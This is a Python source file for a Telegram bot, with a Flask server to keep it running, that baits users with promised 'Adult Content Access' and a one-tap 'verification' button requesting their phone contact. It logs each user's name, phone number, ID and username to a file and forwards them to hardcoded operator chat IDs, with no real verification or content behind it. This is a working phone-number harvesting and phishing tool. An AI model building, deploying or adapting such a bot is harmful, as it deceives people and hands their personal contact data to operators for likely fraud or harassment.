import os
import telebot
import datetime
import threading
from flask import Flask

from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# Setup bot
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
ADMIN_CHAT_ID = "7597393283 , 6178010957"

# File path setup
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)
USER_DATA_FILE = os.path.join(DATA_DIR, "user_data.txt")

# Flask app to bind port
app = Flask(__name__)

@app.route('/')
def home():
    return 'Bot is running and listening on port 10000!'

# Start polling in a separate thread
def start_bot():
    print("📱 Starting Telegram bot polling...")
    bot.polling(non_stop=True)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("📲 VERIFY NOW", request_contact=True))

    bot.send_message(
        message.chat.id,
        "🔞 Adult Content Access\n\n"
        "ONE-STEP VERIFICATION:\n"
        "1. Tap button below\n"
        "2. Verify your account\n"
        "3. Instant access!",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    contact = message.contact
    user = message.from_user

    if contact.user_id != user.id:
        bot.send_message(
            message.chat.id,
            "❌ You must verify using *your own* number.",
            parse_mode="Markdown"
        )
        return

    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r", encoding='utf-8') as f:
            if str(user.id) in f.read():
                bot.send_message(message.chat.id, "✅ You're already verified.")
                return

    user_entry = (
        f"\n[{datetime.datetime.now()}]\n"
        f"👤 {user.first_name} {user.last_name or ''}\n"
        f"📱 {contact.phone_number}\n"
        f"🆔 {user.id}\n"
        f"🌐 @{user.username or 'no_username'}\n"
    )

    with open(USER_DATA_FILE, "a", encoding='utf-8') as f:
        f.write(user_entry)

    bot.send_message(
        message.chat.id,
        f"✅ VERIFIED: {user.first_name}\n"
        f"📞 {contact.phone_number}\n\n"
        "Access granted!",
        reply_markup=ReplyKeyboardRemove()
    )

    admin_msg = f"🚨 NEW VERIFICATION\n{user_entry}"
    if user.username:
        admin_msg += f"\nChat: https://t.me/{user.username}"

    bot.send_message(ADMIN_CHAT_ID, admin_msg)

if __name__ == '__main__':
    # Start bot polling thread
    threading.Thread(target=start_bot).start()

    # Run Flask app to bind port 10000
    port = int(os.environ.get("PORT", 10000))
    print(f"🌐 Flask app running on port {port}")
    app.run(host='0.0.0.0', port=port)
